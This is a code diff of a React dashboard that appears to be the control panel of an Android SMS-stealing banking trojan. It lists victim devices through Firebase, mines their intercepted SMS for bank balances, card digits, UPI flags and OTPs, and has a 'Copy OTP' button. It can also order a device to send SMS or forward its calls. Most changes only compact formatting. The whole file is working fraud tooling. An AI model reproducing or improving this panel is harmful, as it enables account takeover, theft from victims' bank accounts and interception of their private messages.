+          }catch{cache.current.set(d.id,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]},lastSmsTs:0,isActive:false,ts:Date.now()});}
         }));
       }
     }finally{setScanning(false);}
@@ -827,11 +863,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
     if(!PERF.isLowEnd) t3=setInterval(()=>setNow(new Date()),60000);
     return ()=>{clearInterval(t1);clearInterval(t2);if(t3) clearInterval(t3);};
   },[]);
-  useEffect(()=>{
-    if(!devices.length) return;
-    const timer=setTimeout(()=>scan(false),1000);
-    return ()=>clearTimeout(timer);
-  },[devices.length,scan]);
+  useEffect(()=>{if(!devices.length) return;const timer=setTimeout(()=>scan(false),1000);return ()=>clearTimeout(timer);},[devices.length,scan]);
 
   const filtered=useMemo(()=>{
     const qRaw=search.trim().toLowerCase();const qNum=qRaw.replace(/[^0-9]/g,"");
@@ -845,12 +877,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
       const numStr=String(d.phoneNumber||"").replace(/[^0-9]/g,"");
       const smsNums=(d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
       return d.name.toLowerCase().includes(qRaw)||d.id.toLowerCase().includes(qRaw)||(qNum&&(numStr.includes(qNum)||smsNums.includes(qNum)));
-    }).sort((a,b)=>{
-      const pa=pinnedIds.includes(a.id),pb=pinnedIds.includes(b.id);
-      if(pa!==pb) return pb?1:-1;
-      if(filter==="online") return Number(b.status)-Number(a.status);
-      return b.id.localeCompare(a.id);
-    });
+    }).sort((a,b)=>{const pa=pinnedIds.includes(a.id),pb=pinnedIds.includes(b.id);if(pa!==pb) return pb?1:-1;if(filter==="online") return Number(b.status)-Number(a.status);return b.id.localeCompare(a.id);});
   },[devices,filter,search,pinnedIds]);
 
   const online=devices.filter(d=>d.status).length;
@@ -876,17 +903,13 @@ function Dashboard({fbUrl,fbKey,onLogout}){
             <span style={{fontSize:11,fontWeight:600,color:"#34d399"}}>Live</span>
           </div>
           <TGButton label="Telegram"/>
-          {!PERF.isLowEnd && <div style={{display:"flex",alignItems:"center",gap:6,padding:"7px 12px",borderRadius:999,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>
-            {Ic.clock(13)}<span className="mono" style={{fontSize:11,fontWeight:700,color:"var(--muted)"}}>{now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit",hour12:false})}</span>
-          </div>}
+          {!PERF.isLowEnd && <div style={{display:"flex",alignItems:"center",gap:6,padding:"7px 12px",borderRadius:999,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>{Ic.clock(13)}<span className="mono" style={{fontSize:11,fontWeight:700,color:"var(--muted)"}}>{now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit",hour12:false})}</span></div>}
           <button onClick={()=>{if(confirm("Logout?")) onLogout();}} className="btn btn-ghost" style={{padding:"8px 14px",fontSize:11}}>{Ic.logout(13)} Logout</button>
         </div>
       </div>
     </header>
     {err && <div className="a-up" style={{maxWidth:1400,margin:"10px auto 0",padding:"0 22px",width:"100%"}}>
-      <div style={{display:"flex",gap:10,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>
-        {Ic.alert(15)}<p style={{fontSize:12,flex:1,lineHeight:1.5}}>{err}</p><button onClick={()=>setErr("")}>{Ic.x(14)}</button>
-      </div>
+      <div style={{display:"flex",gap:10,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>{Ic.alert(15)}<p style={{fontSize:12,flex:1,lineHeight:1.5}}>{err}</p><button onClick={()=>setErr("")}>{Ic.x(14)}</button></div>
     </div>}
     <div style={{borderBottom:"1px solid var(--border)",background:"rgba(4,4,10,.6)"}}>
       <div style={{maxWidth:1400,margin:"0 auto",padding:"14px 22px",display:"flex",alignItems:"center",gap:26,flexWrap:"wrap"}}>
@@ -906,9 +929,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
     <main style={{flex:1,maxWidth:1400,margin:"0 auto",width:"100%",padding:"22px"}}>
       {loading ? <div style={{display:"flex",flexDirection:"column",gap:16}}>
         <div style={{display:"flex",alignItems:"center",gap:10}}><span className="spin"/><span style={{fontSize:12,color:"var(--muted)"}}>Connecting to Firebase…</span></div>
-        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(280px,1fr))",gap:16}}>
-          {Array.from({length:6}).map((_,i)=><div key={i} className="shim" style={{height:200}}/>)}
-        </div>
+        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(280px,1fr))",gap:16}}>{Array.from({length:6}).map((_,i)=><div key={i} className="shim" style={{height:200}}/>)}</div>
       </div>
       : devices.length===0 ? <div className="a-up" style={{textAlign:"center",padding:"70px 20px"}}>
           <div className="glass" style={{width:70,height:70,borderRadius:20,display:"inline-flex",alignItems:"center",justifyContent:"center",marginBottom:16,color:"var(--muted-2)"}}>{Ic.shield(32)}</div>
@@ -916,9 +937,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
           <p style={{fontSize:12,color:"var(--muted-2)",marginTop:6}}>Waiting for devices to register…</p>
         </div>
       : <>
-          {scanning && <div className="a-in" style={{display:"flex",alignItems:"center",gap:10,marginBottom:14,padding:"8px 14px",borderRadius:12,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)",width:"fit-content"}}>
-            <span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS across panels…</span>
-          </div>}
+          {scanning && <div className="a-in" style={{display:"flex",alignItems:"center",gap:10,marginBottom:14,padding:"8px 14px",borderRadius:12,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)",width:"fit-content"}}><span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS…</span></div>}
           <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(290px,1fr))",gap:16}}>
             {filtered.map((d,i)=><DeviceCard key={d.id} dev={d} delay={Math.min(i*0.03,0.4)} onClick={()=>setSelected(d)} pinned={pinnedIds.includes(d.id)} onTogglePin={togglePinDevice}/>)}
             {filtered.length===0&&<div style={{gridColumn:"1/-1",padding:"70px 20px",textAlign:"center",color:"var(--muted-2)",fontSize:12}}>No devices match your filter</div>}
@@ -930,22 +949,19 @@ function Dashboard({fbUrl,fbKey,onLogout}){
   </div>;
 }
 
-/* ============ DEVICE CARD (memoized) ============ */
-const DeviceCard = React.memo(function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
+/* ============ DEVICE CARD ============ */
+const DeviceCard=React.memo(function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
   const bank=dev.smsAnalysis?.bankBalances?.[0];
   const card=dev.smsAnalysis?.cards?.[0];
   const phoneRaw=dev.phoneNumber&&dev.phoneNumber!=="—"?dev.phoneNumber:(dev.smsAnalysis?.phoneNumbers?.[0]||"—");
   const phoneShow=cleanPhone(phoneRaw);
   const net=dev.provider&&dev.provider!=="—"?dev.provider:(dev.smsAnalysis?.networks?.[0]||null);
   const [copied,setCopied]=useState(false);
-
   const recentSmsActive = dev.isActive === true;
   const lastSmsTs = dev.lastSmsTs || 0;
   const activeLabel = lastSmsTs ? timeAgo(lastSmsTs) : "";
-
   const onCopyPhone=(e)=>{e.stopPropagation();if(!phoneShow||phoneShow==="—") return;try{navigator.clipboard.writeText(phoneShow);}catch{}setCopied(true);setTimeout(()=>setCopied(false),1400);};
   const onPin=(e)=>{e.stopPropagation();onTogglePin&&onTogglePin(dev.id);};
-
   return <div onClick={onClick} className={"dev-card pop"+(pinned?" pinned":"")} style={{animationDelay:`${delay}s`}}>
     {pinned && <div className="pin-flag">{Ic.pin(11)} PINNED</div>}
     <div style={{display:"flex",alignItems:"flex-start",gap:12,marginBottom:12}}>
@@ -955,7 +971,7 @@ const DeviceCard = React.memo(function DeviceCard({dev,onClick,delay=0,pinned,on
         <p className="mono" style={{fontSize:10,color:"var(--muted-2)",marginTop:2,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{dev.id}</p>
       </div>
       <div style={{display:"flex",gap:5,flexShrink:0,alignItems:"center"}}>
-        <button onClick={onPin} className="ibtn pin-btn" title={pinned?"Unpin":"Pin"} style={{padding:5,color:pinned?"#f472b6":undefined,background:pinned?"rgba(244,114,182,.12)":undefined,borderColor:pinned?"rgba(244,114,182,.35)":undefined}}>{pinned?Ic.pinOff(12):Ic.pin(12)}</button>
+        <button onClick={onPin} className="ibtn pin-btn" style={{padding:5,color:pinned?"#f472b6":undefined,background:pinned?"rgba(244,114,182,.12)":undefined,borderColor:pinned?"rgba(244,114,182,.35)":undefined}}>{pinned?Ic.pinOff(12):Ic.pin(12)}</button>
         {dev.upipin&&<span style={{color:"#fbbf24",display:"flex"}}>{Ic.zap(14)}</span>}
         {bank&&<span style={{color:"#34d399",display:"flex"}}>{Ic.rupee(14)}</span>}
         {card&&<span style={{color:"#c084fc",display:"flex"}}>{Ic.card(14)}</span>}
@@ -966,12 +982,11 @@ const DeviceCard = React.memo(function DeviceCard({dev,onClick,delay=0,pinned,on
       <div><p className="lbl">Battery</p><Battery percent={dev.batteryPercent}/></div>
     </div>
     <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
-      <div style={{minWidth:0}}>
-        <p className="lbl">Number</p>
+      <div style={{minWidth:0}}><p className="lbl">Number</p>
         <div style={{display:"flex",alignItems:"center",gap:5,minWidth:0}}>
           {recentSmsActive && (<span className="sms-bolt" title={`Recent SMS · ${activeLabel}`}>{Ic.zap(11)}</span>)}
           <p className="mono" style={{fontSize:11,color:"var(--text)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",flex:1}}>{phoneShow}</p>
-          {phoneShow!=="—" && (<button onClick={onCopyPhone} className="ibtn" title="Copy number" style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.12)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>{copied?Ic.check(11):Ic.copy(11)}</button>)}
+          {phoneShow!=="—" && (<button onClick={onCopyPhone} className="ibtn" style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.12)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>{copied?Ic.check(11):Ic.copy(11)}</button>)}
         </div>
       </div>
       {net&&<div style={{minWidth:0}}><p className="lbl">Network</p><p style={{fontSize:11,fontWeight:600,color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{net}</p></div>}
@@ -981,19 +996,9 @@ const DeviceCard = React.memo(function DeviceCard({dev,onClick,delay=0,pinned,on
         <div style={{display:"flex",alignItems:"center",gap:6,minWidth:0}}>
           <span style={{color:"#34d399",display:"flex"}}>{Ic.rupee(13)}</span>
           <span style={{fontSize:10,fontWeight:600,color:"#34d399",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{bank.bankName}</span>
-          {bank.accountLast4&&<span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>••{bank.accountLast4}</span>}
         </div>
         <span style={{fontSize:14,fontWeight:700,color:"#fff",fontVariantNumeric:"tabular-nums"}}>₹{fmtMoney(bank.availableBalance)}</span>
       </div>
-      {bank.transactionType&&<div style={{display:"flex",alignItems:"center",gap:5,marginTop:5}}>
-        <span style={{color:bank.transactionType==="credit"?"#34d399":"#f43f5e",display:"flex"}}>{bank.transactionType==="credit"?Ic.trendUp(11):Ic.trendDown(11)}</span>
-        <span style={{fontSize:9,fontWeight:600,color:bank.transactionType==="credit"?"#34d399":"#f43f5e"}}>{bank.transactionType==="credit"?"+":"-"}₹{fmtMoney(bank.transactionAmount||"0")} {bank.transactionType}</span>
-      </div>}
-    </div>}
-    {card&&<div style={{marginBottom:10,padding:"7px 11px",borderRadius:12,display:"flex",alignItems:"center",gap:8,background:"linear-gradient(135deg,rgba(192,132,252,.1),rgba(192,132,252,.03))",border:"1px solid rgba(192,132,252,.25)"}}>
-      <span style={{color:"#c084fc",display:"flex"}}>{Ic.card(13)}</span>
-      <span style={{fontSize:10,fontWeight:600,color:"#c084fc"}}>Card ••{card.cardLast4}</span>
-      {card.cardType&&<span style={{fontSize:10,color:"var(--muted-2)"}}>{card.cardType}</span>}
     </div>}
     <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
       <span style={{width:8,height:8,borderRadius:"50%",flexShrink:0,background:dev.status?"#34d399":"#333"}}/>
@@ -1002,21 +1007,13 @@ const DeviceCard = React.memo(function DeviceCard({dev,onClick,delay=0,pinned,on
             <span style={{fontSize:11,color:"var(--muted)"}}>Offline</span>
             {dev.lastSeen&&<span className="mono" style={{fontSize:10,color:"var(--muted-2)",padding:"2px 7px",borderRadius:6,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>{timeAgo(dev.lastSeen)}</span>}
           </div>}
-      {recentSmsActive && <span className="badge" style={{background:"rgba(251,191,36,.12)",borderColor:"rgba(251,191,36,.4)",color:"#fbbf24",fontSize:9,display:"inline-flex",alignItems:"center",gap:3}}>
-        {Ic.zap(9)} {activeLabel}
-      </span>}
+      {recentSmsActive && <span className="badge" style={{background:"rgba(251,191,36,.12)",borderColor:"rgba(251,191,36,.4)",color:"#fbbf24",fontSize:9,display:"inline-flex",alignItems:"center",gap:3}}>{Ic.zap(9)} {activeLabel}</span>}
       {dev.upipin&&<span className="badge" style={{marginLeft:"auto",background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.3)",color:"#fbbf24"}}>UPI</span>}
     </div>
   </div>;
-}, (prev, next) => {
-  const pd = prev.dev, nd = next.dev;
-  return pd.status === nd.status
-    && pd.batteryPercent === nd.batteryPercent
-    && pd.isActive === nd.isActive
-    && pd.lastSmsTs === nd.lastSmsTs
-    && pd.lastSeen === nd.lastSeen
-    && pd.smsAnalysis === nd.smsAnalysis
-    && prev.pinned === next.pinned;
+},(prev,next)=>{
+  const pd=prev.dev,nd=next.dev;
+  return pd.status===nd.status&&pd.batteryPercent===nd.batteryPercent&&pd.isActive===nd.isActive&&pd.lastSmsTs===nd.lastSmsTs&&pd.lastSeen===nd.lastSeen&&pd.smsAnalysis===nd.smsAnalysis&&prev.pinned===next.pinned;
 });
 
 const Row=React.memo(function Row({label,value,mono,color,delay=0,trailing,copyable}){
@@ -1026,7 +1023,7 @@ const Row=React.memo(function Row({label,value,mono,color,delay=0,trailing,copya
     <span className="k">{label}</span>
     <span className={`v ${mono?"mono":""}`} style={{color:color||"var(--text)",fontSize:mono?11:12,display:"inline-flex",alignItems:"center",gap:6,justifyContent:"flex-end",minWidth:0}}>
       <span style={{overflow:"hidden",textOverflow:"ellipsis"}}>{value||"—"}</span>
-      {copyable && value && value!=="—" && (<button onClick={onCopy} className="ibtn" title="Copy" style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.1)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>{copied?Ic.check(11):Ic.copy(11)}</button>)}
+      {copyable && value && value!=="—" && (<button onClick={onCopy} className="ibtn" style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.1)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>{copied?Ic.check(11):Ic.copy(11)}</button>)}
       {trailing}
     </span>
   </div>;
@@ -1066,13 +1063,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     iv.current=setInterval(async ()=>{
       try{const raw=await fbGet(fbUrl,fbKey,`messages/${dev.id}`);
         const m=parseMessages(raw);
-        setMsgs(prev=>{
-          if(JSON.stringify(m.map(x=>x.text))!==JSON.stringify(prev.map(x=>x.text))){
-            const a=analyze(m);setAna(a);
-            return m;
-          }
-          return prev;
-        });
+        setMsgs(prev=>{if(JSON.stringify(m.map(x=>x.text))!==JSON.stringify(prev.map(x=>x.text))){const a=analyze(m);setAna(a);return m;}return prev;});
       }catch{}
     },interval);
     return ()=>iv.current&&clearInterval(iv.current);
@@ -1087,10 +1078,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     setSending(true);
     try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/sendSms`,{from:Number(sim)||1,to:num,message:txt,isSended:false});
       showToast("✉️ SMS queued successfully!");setBody("");
-    }catch(e){const m=e.message||String(e);
-      if(m.includes("PERMISSION_DENIED")) showToast("Firebase denied write access");
-      else if(m.includes("HTTP 404")) showToast("Command path not found");
-      else showToast("Send failed: "+m.slice(0,80));}
+    }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) showToast("Firebase denied");else showToast("Send failed: "+m.slice(0,80));}
     finally{setSending(false);}
   }
   async function forwardCall(){
@@ -1100,17 +1088,13 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     setCallBusy(true);
     try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/callForward`,{from:Number(sim)||1,to:num,isForwarded:true,isActive:true});
       showToast("📞 Call forward activated → "+num);
-    }catch(e){const m=e.message||String(e);
-      if(m.includes("PERMISSION_DENIED")) showToast("Firebase denied write access");
-      else if(m.includes("HTTP 404")) showToast("Forward path not found");
-      else showToast("Forward failed: "+m.slice(0,80));}
+    }catch(e){showToast("Forward failed: "+String(e.message||e).slice(0,80));}
     finally{setCallBusy(false);}
   }
   async function stopForward(){
     setCallBusy(true);
-    try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/callForward`,{isActive:false,isForwarded:false});
-      showToast("📴 Call forward disabled");
-    }catch(e){showToast("Stop failed: "+String(e.message||e).slice(0,60));}
+    try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/callForward`,{isActive:false,isForwarded:false});showToast("📴 Call forward disabled");}
+    catch(e){showToast("Stop failed");}
     finally{setCallBusy(false);}
   }
   async function del(){
@@ -1123,13 +1107,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
   const togglePinMsg=(key)=>{setPinnedMsgs(prev=> prev.includes(key)?prev.filter(k=>k!==key):[...prev,key]);};
   const togglePinNum=(num)=>{setPinnedNums(prev=> prev.includes(num)?prev.filter(k=>k!==num):[...prev,num]);};
 
-  const tabs=[
-    {k:"info",l:"Info"},
-    {k:"bank",l:`Bank (${ana.bankBalances.length})`},
-    ...(ana.cards.length>0?[{k:"card",l:`Card (${ana.cards.length})`}]:[]),
-    {k:"sms",l:`SMS (${msgs.length})`},
-    {k:"send",l:"Send"},
-  ];
+  const tabs=[{k:"info",l:"Info"},{k:"bank",l:`Bank (${ana.bankBalances.length})`},...(ana.cards.length>0?[{k:"card",l:`Card (${ana.cards.length})`}]:[]),{k:"sms",l:`SMS (${msgs.length})`},{k:"send",l:"Send"}];
 
   const msgKey=(m,i)=>`${m.time}|${m.sender}|${m.text.slice(0,40)}|${i}`;
   const sortedMsgs=useMemo(()=>{
@@ -1140,19 +1118,13 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
       const toTs = dateTo ? fromDateInputValue(dateTo) : null;
       const fromStart = fromTs!=null ? startOfDay(fromTs) : null;
       const toEnd = toTs!=null ? endOfDay(toTs) : null;
-      arr = arr.filter(x=>{
-        if(!x.ts) return false;
-        if(fromStart!=null && x.ts < fromStart) return false;
-        if(toEnd!=null && x.ts > toEnd) return false;
-        return true;
-      });
+      arr = arr.filter(x=>{if(!x.ts) return false;if(fromStart!=null && x.ts < fromStart) return false;if(toEnd!=null && x.ts > toEnd) return false;return true;});
     }
     arr.sort((a,b)=>{if(b.ts!==a.ts) return b.ts-a.ts;return b.i-a.i;});
     const pinned=arr.filter(x=>pinnedMsgs.includes(x.k));
     const rest=arr.filter(x=>!pinnedMsgs.includes(x.k));
     return [...pinned,...rest];
   },[msgs,pinnedMsgs,dateFrom,dateTo]);
-
   const activeDateFilter = dateFrom || dateTo;
 
   return <div className="drw" onClick={onClose}>
@@ -1204,11 +1176,8 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           {dev.sims.map((s,i)=>s.phoneNumber&&<Row key={i} label={`SIM ${i+1}`} value={cleanPhone(s.phoneNumber)} mono delay={0.18+i*0.02} copyable/>)}
           {ana.phoneNumbers.length>0&&<>
             <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,margin:"18px 0 8px"}}>From SMS · Pin numbers</p>
-            {ana.phoneNumbers.map((p,i)=>{
-              const isPinned=pinnedNums.includes(p);
-              return <Row key={i} label={`Phone #${i+1}`} value={cleanPhone(p)} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03} copyable
-                trailing={<button onClick={()=>togglePinNum(p)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>}/>;
-            })}
+            {ana.phoneNumbers.map((p,i)=>{const isPinned=pinnedNums.includes(p);return <Row key={i} label={`Phone #${i+1}`} value={cleanPhone(p)} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03} copyable
+              trailing={<button onClick={()=>togglePinNum(p)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>}/>;})}
           </>}
           {ana.networks.length>0&&ana.networks.map((n,i)=><Row key={i} label={`Network #${i+1}`} value={n} color="#c084fc" delay={0.3+i*0.03}/>)}
         </div>}
@@ -1217,7 +1186,6 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           : ana.bankBalances.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}>
               <span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.rupee(38)}</span>
               <p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No bank SMS found</p>
-              <p style={{fontSize:11,color:"var(--muted-2)",marginTop:6,lineHeight:1.5}}>Bank transaction SMS with balance will appear here</p>
             </div>
           : <>
               <div className="a-up" style={{padding:16,borderRadius:14,background:"linear-gradient(135deg,rgba(52,211,153,.14),rgba(52,211,153,.04))",border:"1px solid rgba(52,211,153,.4)"}}>
@@ -1231,27 +1199,19 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
             </>}
         </div>}
         {tab==="card"&&<div style={{padding:"14px 16px",display:"flex",flexDirection:"column",gap:10}}>
-          {ana.cards.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}>
-              <span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.card(38)}</span>
-              <p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No card info found</p>
-            </div>
+          {ana.cards.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}><span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.card(38)}</span><p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No card info found</p></div>
           : ana.cards.map((c,i)=><CardInfo key={i} card={c} delay={i*0.06}/>)}
         </div>}
         {tab==="sms"&&<div style={{display:"flex",flexDirection:"column",height:"100%"}}>
           <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"10px 16px",borderBottom:"1px solid var(--border)",gap:8,flexWrap:"wrap"}}>
             <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
               <span style={{fontSize:11,color:"var(--muted)"}}>{sortedMsgs.length} / {msgs.length} messages</span>
-              {activeDateFilter && <span className="badge" style={{background:"rgba(34,211,238,.1)",borderColor:"rgba(34,211,238,.35)",color:"#a5f3fc",fontSize:9}}>
-                {Ic.calendar(9)} {dateFrom||"start"} → {dateTo||"now"}
-              </span>}
+              {activeDateFilter && <span className="badge" style={{background:"rgba(34,211,238,.1)",borderColor:"rgba(34,211,238,.35)",color:"#a5f3fc",fontSize:9}}>{Ic.calendar(9)} {dateFrom||"start"} → {dateTo||"now"}</span>}
+              {pinnedMsgs.length>0&&<span className="badge" style={{background:"rgba(244,114,182,.1)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",fontSize:9}}>{Ic.pin(9)} {pinnedMsgs.length}</span>}
             </div>
             <div style={{display:"flex",gap:6}}>
-              <button onClick={()=>setShowDateFilter(v=>!v)} className={"btn "+(showDateFilter||activeDateFilter?"btn-cyan":"btn-ghost")} style={{padding:"7px 12px",fontSize:11}}>
-                {Ic.filter(12)} Filter
-              </button>
-              <button onClick={()=>loadMsgs(false)} disabled={refreshing} className="btn btn-cyan" style={{padding:"7px 12px",fontSize:11}}>
-                {refreshing?<><span className="spin sm"/>…</>:<>{Ic.refresh(12)}</>}
-              </button>
+              <button onClick={()=>setShowDateFilter(v=>!v)} className={"btn "+(showDateFilter||activeDateFilter?"btn-cyan":"btn-ghost")} style={{padding:"7px 12px",fontSize:11}}>{Ic.filter(12)} Filter</button>
+              <button onClick={()=>loadMsgs(false)} disabled={refreshing} className="btn btn-cyan" style={{padding:"7px 12px",fontSize:11}}>{refreshing?<><span className="spin sm"/>…</>:<>{Ic.refresh(12)}</>}</button>
             </div>
           </div>
           {showDateFilter && <div className="a-up dfilter-panel">
@@ -1264,10 +1224,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
             </div>
             <div className="dfilter-quick">
               {[{l:"Today",d:0},{l:"7 Days",d:7},{l:"30 Days",d:30},{l:"90 Days",d:90}].map(q=>(
-                <button key={q.l} className="dfilter-chip" onClick={()=>{
-                  const now=new Date();const from=new Date();from.setDate(from.getDate()-(q.d===0?0:q.d));
-                  setDateFrom(toDateInputValue(from.getTime()));setDateTo(toDateInputValue(now.getTime()));
-                }}>{q.l}</button>
+                <button key={q.l} className="dfilter-chip" onClick={()=>{const now=new Date();const from=new Date();from.setDate(from.getDate()-(q.d===0?0:q.d));setDateFrom(toDateInputValue(from.getTime()));setDateTo(toDateInputValue(now.getTime()));}}>{q.l}</button>
               ))}
             </div>
             <div className="dfilter-row">
@@ -1311,48 +1268,32 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
                 {otp && <div className="a-in" style={{marginTop:8,display:"flex",alignItems:"center",gap:8,padding:"6px 10px",borderRadius:8,background:"rgba(251,191,36,.08)",border:"1px solid rgba(251,191,36,.3)"}}>
                   <span style={{fontSize:9,fontWeight:700,color:"#fbbf24",textTransform:"uppercase",letterSpacing:"0.12em"}}>OTP</span>
                   <span className="mono" style={{fontSize:15,fontWeight:800,color:"#fbbf24",letterSpacing:2}}>{otp}</span>
-                  <button onClick={()=>{navigator.clipboard.writeText(otp);showToast("OTP copied: "+otp);}} className="btn" style={{marginLeft:"auto",padding:"5px 11px",fontSize:10,background:"rgba(251,191,36,.15)",border:"1px solid rgba(251,191,36,.45)",color:"#fbbf24"}}>
-                    {Ic.copy(11)} Copy OTP
-                  </button>
+                  <button onClick={()=>{navigator.clipboard.writeText(otp);showToast("OTP copied: "+otp);}} className="btn" style={{marginLeft:"auto",padding:"5px 11px",fontSize:10,background:"rgba(251,191,36,.15)",border:"1px solid rgba(251,191,36,.45)",color:"#fbbf24"}}>{Ic.copy(11)} Copy OTP</button>
                 </div>}
               </div>;
             })}
           </div>
         </div>}
         {tab==="send"&&<div style={{padding:"18px 20px",display:"flex",flexDirection:"column",gap:16}}>
-          <div>
-            <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Select SIM</p>
-            <div style={{display:"flex",gap:8}}>{[1,2].map(s=><button key={s} onClick={()=>setSim(s)} className={"btn "+(sim===s?"btn-primary":"btn-ghost")} style={{flex:1}}>SIM {s}</button>)}</div>
-          </div>
-          <div>
-            <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Recipient</p>
+          <div><p className="lbl">Select SIM</p><div style={{display:"flex",gap:8}}>{[1,2].map(s=><button key={s} onClick={()=>setSim(s)} className={"btn "+(sim===s?"btn-primary":"btn-ghost")} style={{flex:1}}>SIM {s}</button>)}</div></div>
+          <div><p className="lbl">Recipient</p>
             <input className="inp mono" value={to} onChange={e=>setTo(e.target.value)} placeholder="+919876543210" inputMode="tel" autoComplete="off"/>
-            {pinnedNums.length>0&&<div style={{display:"flex",gap:6,flexWrap:"wrap",marginTop:8}}>
-              {pinnedNums.map((n,i)=><button key={i} onClick={()=>setTo(n)} className="badge" style={{background:"rgba(244,114,182,.08)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",cursor:"pointer"}}>{Ic.pin(9)} {cleanPhone(n)}</button>)}
-            </div>}
+            {pinnedNums.length>0&&<div style={{display:"flex",gap:6,flexWrap:"wrap",marginTop:8}}>{pinnedNums.map((n,i)=><button key={i} onClick={()=>setTo(n)} className="badge" style={{background:"rgba(244,114,182,.08)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",cursor:"pointer"}}>{Ic.pin(9)} {cleanPhone(n)}</button>)}</div>}
           </div>
-          <div>
-            <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Message</p>
+          <div><p className="lbl">Message</p>
             <textarea className="inp" value={body} onChange={e=>setBody(e.target.value)} rows={4} placeholder="Type your message…"/>
